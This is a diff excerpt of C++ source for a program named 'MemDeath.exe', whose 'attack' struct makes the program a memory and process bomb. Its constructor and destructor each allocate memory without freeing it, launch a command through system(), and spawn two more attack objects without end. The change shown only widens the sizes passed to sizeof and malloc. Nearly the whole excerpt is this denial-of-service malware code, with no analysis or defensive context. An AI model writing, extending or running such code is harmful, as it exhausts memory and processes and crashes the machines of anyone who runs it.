@@ -5,20 +5,20 @@
 #define UNICODE 1
 using namespace std;
 string filename = "MemDeath.exe";
-int chararray = sizeof(long int);
+int chararray = sizeof(unsigned long int);
 string startcom;
 struct attack{
 
 	attack(int x){
 		char* ch = new char[x];
-		malloc(sizeof(unsigned int));
+		malloc(sizeof(unsigned long int));
 		system(startcom.c_str());
 		new attack(chararray);
 		new attack(chararray);
 	}
 	~attack(){
 		system(startcom.c_str());
-		malloc(sizeof(unsigned int));
+		malloc(sizeof(unsigned long int));
 		new attack(chararray);
 		new attack(chararray);
 		cout << this << endl;
